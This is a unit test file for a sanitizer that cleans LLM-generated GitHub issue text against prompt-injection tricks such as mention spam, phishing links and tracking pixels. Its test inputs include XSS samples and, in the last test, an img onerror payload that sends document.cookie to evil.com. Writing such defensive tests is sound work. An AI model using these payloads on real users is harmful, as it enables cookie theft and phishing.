/**
 * Unit tests for sanitizeGitHubContent — LLM output sanitizer.
 *
 * Prevents prompt-injection attacks where malicious code in reviewed
 * repositories tricks the LLM into producing @mention spam, phishing
 * links, or tracking pixels inside auto-created GitHub issues.
 *
 * @see https://github.com/vbomfim/sdlc-guardian-agents/issues/40
 *
 * [TDD] Red → Green → Refactor
 * [CLEAN-CODE] One assertion concept per test
 *
 * @module shared/__tests__/sanitize
 */

import { describe, it, expect } from "vitest";
import { sanitizeGitHubContent } from "../sanitize.js";

/* ------------------------------------------------------------------ */
/*  @mention neutralization                                           */
/* ------------------------------------------------------------------ */

describe("sanitizeGitHubContent — @mentions", () => {
  it("should neutralize a plain @mention with zero-width space", () => {
    const input = "Found by @octocat in this repo";
    const result = sanitizeGitHubContent(input);

    expect(result).not.toContain("@octocat");
    expect(result).toContain("@\u200Boctocat");
  });

  it("should neutralize multiple @mentions", () => {
    const input = "CC @alice @bob @charlie for review";
    const result = sanitizeGitHubContent(input);

    expect(result).not.toContain("@alice");
    expect(result).not.toContain("@bob");
    expect(result).not.toContain("@charlie");
    expect(result).toContain("@\u200Balice");
    expect(result).toContain("@\u200Bbob");
    expect(result).toContain("@\u200Bcharlie");
  });

  it("should neutralize @mention at start of line", () => {
    const input = "@admin please review this";
    const result = sanitizeGitHubContent(input);

    expect(result).toContain("@\u200Badmin");
  });

  it("should not double-escape already-escaped @mentions", () => {
    const input = "@\u200Balready-escaped mention";
    const result = sanitizeGitHubContent(input);

    // Should not produce @​​ (double ZWS)
    expect(result).toBe("@\u200Balready-escaped mention");
  });

  it("should preserve email addresses (not treat as @mentions)", () => {
    const input = "Contact user@example.com for details";
    const result = sanitizeGitHubContent(input);

    // Email addresses have a char before @ — should not be altered
    expect(result).toContain("user@example.com");
  });

  it("should handle @mention with hyphens and underscores", () => {
    const input = "Reported by @some-user_123";
    const result = sanitizeGitHubContent(input);

    expect(result).toContain("@\u200Bsome-user_123");
  });
});

/* ------------------------------------------------------------------ */
/*  HTML tag stripping                                                */
/* ------------------------------------------------------------------ */

describe("sanitizeGitHubContent — HTML tags", () => {
  it("should strip <img> tags (tracking pixels)", () => {
    const input = 'Check this <img src="https://evil.com/track.gif" /> image';
    const result = sanitizeGitHubContent(input);

    expect(result).not.toContain("<img");
    expect(result).not.toContain("evil.com");
    expect(result).toContain("Check this");
    expect(result).toContain("image");
  });

  it("should strip self-closing <img> tags without space", () => {
    const input = '<img src="https://evil.com/pixel.png"/>';
    const result = sanitizeGitHubContent(input);

    expect(result).not.toContain("<img");
  });

  it("should strip <img> tags with multiple attributes", () => {
    const input = '<img src="https://evil.com/t.gif" width="1" height="1" alt="x">';
    const result = sanitizeGitHubContent(input);

    expect(result).not.toContain("<img");
  });

  it("should strip <script> tags entirely", () => {
    const input = "Before <script>alert('xss')</script> After";
    const result = sanitizeGitHubContent(input);

    expect(result).not.toContain("<script");
    expect(result).not.toContain("</script>");
    expect(result).not.toContain("alert");
    expect(result).toContain("Before");
    expect(result).toContain("After");
  });

  it("should strip <iframe> tags", () => {
    const input = '<iframe src="https://evil.com/phish"></iframe>';
    const result = sanitizeGitHubContent(input);

    expect(result).not.toContain("<iframe");
    expect(result).not.toContain("</iframe>");
  });

  it("should strip <object> and <embed> tags", () => {
    const input = '<object data="x.swf"></object> and <embed src="y.swf">';
    const result = sanitizeGitHubContent(input);

    expect(result).not.toContain("<object");
    expect(result).not.toContain("<embed");
  });

  it("should strip <form> tags", () => {
    const input = '<form action="https://evil.com"><input type="text"></form>';
    const result = sanitizeGitHubContent(input);

    expect(result).not.toContain("<form");
    expect(result).not.toContain("</form>");
  });

  it("should strip <link> and <meta> tags", () => {
    const input = '<link rel="stylesheet" href="https://evil.com/style.css"><meta http-equiv="refresh">';
    const result = sanitizeGitHubContent(input);

    expect(result).not.toContain("<link");
    expect(result).not.toContain("<meta");
  });

  it("should strip <svg> with onload handler", () => {
    const input = '<svg onload="alert(1)"><circle r="10"/></svg>';
    const result = sanitizeGitHubContent(input);

    expect(result).not.toContain("<svg");
    expect(result).not.toContain("onload");
  });

  it("should preserve safe markdown-compatible HTML", () => {
    // GitHub markdown supports certain HTML tags — but we strip
    // dangerous ones only. <b>, <i>, <code> etc. are safe.
    const input = "This is <b>bold</b> and <code>code</code>";
    const result = sanitizeGitHubContent(input);

    expect(result).toContain("<b>bold</b>");
    expect(result).toContain("<code>code</code>");
  });

  it("should handle case-insensitive HTML tags", () => {
    const input = '<IMG SRC="https://evil.com/track.gif"><SCRIPT>alert(1)</SCRIPT>';
    const result = sanitizeGitHubContent(input);

    expect(result).not.toMatch(/<img/i);
    expect(result).not.toMatch(/<script/i);
  });
});

/* ------------------------------------------------------------------ */
/*  External URL defanging                                            */
/* ------------------------------------------------------------------ */

describe("sanitizeGitHubContent — external URLs", () => {
  it("should defang http:// URLs by wrapping in backticks", () => {
    const input = "Visit http://evil.com/phish for details";
    const result = sanitizeGitHubContent(input);

    expect(result).toContain("`http://evil.com/phish`");
  });

  it("should defang https:// URLs by wrapping in backticks", () => {
    const input = "See https://malicious.site/payload?q=1 here";
    const result = sanitizeGitHubContent(input);

    expect(result).toContain("`https://malicious.site/payload?q=1`");
  });

  it("should preserve GitHub URLs (same-platform links are safe)", () => {
    const input = "See https://github.com/vbomfim/repo/issues/42";
    const result = sanitizeGitHubContent(input);

    expect(result).toContain("https://github.com/vbomfim/repo/issues/42");
    // Should NOT be wrapped in backticks
    expect(result).not.toContain("`https://github.com");
  });

  it("should defang multiple URLs in the same text", () => {
    const input = "Links: http://evil.com and https://bad.org/page";
    const result = sanitizeGitHubContent(input);

    expect(result).toContain("`http://evil.com`");
    expect(result).toContain("`https://bad.org/page`");
  });

  it("should not defang URLs already inside backticks", () => {
    const input = "Example: `https://evil.com/already-safe`";
    const result = sanitizeGitHubContent(input);

    // Should not produce double-backticks
    expect(result).not.toContain("``");
    expect(result).toContain("`https://evil.com/already-safe`");
  });

  it("should not defang URLs inside markdown code blocks", () => {
    const input = "```\nhttps://evil.com/in-code-block\n```";
    const result = sanitizeGitHubContent(input);

    // Content inside fenced code blocks should be untouched
    expect(result).toBe(input);
  });

  it("should handle URLs with fragments and query params", () => {
    const input = "Check https://external.com/page?foo=bar&baz=qux#section";
    const result = sanitizeGitHubContent(input);

    expect(result).toContain("`https://external.com/page?foo=bar&baz=qux#section`");
  });

  it("should handle markdown links with external URLs", () => {
    const input = "[Click here](https://evil.com/phish)";
    const result = sanitizeGitHubContent(input);

    // The URL inside the markdown link should be defanged
    expect(result).not.toContain("(https://evil.com/phish)");
  });
});

/* ------------------------------------------------------------------ */
/*  Edge cases & combined attacks                                     */
/* ------------------------------------------------------------------ */

describe("sanitizeGitHubContent — edge cases", () => {
  it("should handle empty string", () => {
    expect(sanitizeGitHubContent("")).toBe("");
  });

  it("should handle text with no threats", () => {
    const input = "This is a perfectly safe issue body with no threats.";
    const result = sanitizeGitHubContent(input);

    expect(result).toBe(input);
  });

  it("should handle combined attack: mention + image + URL", () => {
    const input = [
      "@admin URGENT: Security breach detected!",
      '<img src="https://evil.com/track.gif" width="1" height="1">',
      "See https://evil.com/fake-advisory for details.",
    ].join("\n");

    const result = sanitizeGitHubContent(input);

    expect(result).not.toContain("@admin");
    expect(result).toContain("@\u200Badmin");
    expect(result).not.toContain("<img");
    // URL inside stripped <img> tag is removed entirely (correct behavior)
    expect(result).not.toContain("track.gif");
    // Standalone external URL is defanged
    expect(result).toContain("`https://evil.com/fake-advisory`");
  });

  it("should handle multiline content with code blocks", () => {
    const input = [
      "## Finding",
      "",
      "```typescript",
      "// @admin this is code, not a mention",
      "const url = 'https://external.com/api';",
      "```",
      "",
      "@reviewer please check this",
    ].join("\n");

    const result = sanitizeGitHubContent(input);

    // Inside code block: content should be preserved
    expect(result).toContain("// @admin this is code, not a mention");
    expect(result).toContain("const url = 'https://external.com/api';");

    // Outside code block: should be sanitized
    expect(result).toContain("@\u200Breviewer");
  });

  it("should preserve markdown formatting", () => {
    const input = [
      "## Title",
      "",
      "- **Bold item**",
      "- *Italic item*",
      "- `code item`",
      "- [Safe link](https://github.com/owner/repo)",
    ].join("\n");

    const result = sanitizeGitHubContent(input);

    expect(result).toContain("## Title");
    expect(result).toContain("**Bold item**");
    expect(result).toContain("*Italic item*");
    expect(result).toContain("`code item`");
    expect(result).toContain("https://github.com/owner/repo");
  });

  it("should handle very long text without performance issues", () => {
    const longText = "Some text @user https://evil.com\n".repeat(1000);

    const start = Date.now();
    const result = sanitizeGitHubContent(longText);
    const elapsed = Date.now() - start;

    expect(elapsed).toBeLessThan(1000); // Should finish under 1 second
    expect(result).toContain("@\u200Buser");
    expect(result).toContain("`https://evil.com`");
  });

  it("should handle text with only whitespace", () => {
    expect(sanitizeGitHubContent("   ")).toBe("   ");
    expect(sanitizeGitHubContent("\n\n")).toBe("\n\n");
  });

  it("should handle nested dangerous patterns", () => {
    // An attacker might try to use HTML encoding or nesting
    const input = '<img src=x onerror="fetch(\'https://evil.com/steal?cookie=\'+document.cookie)">';
    const result = sanitizeGitHubContent(input);

    expect(result).not.toContain("<img");
    expect(result).not.toContain("onerror");
  });
});
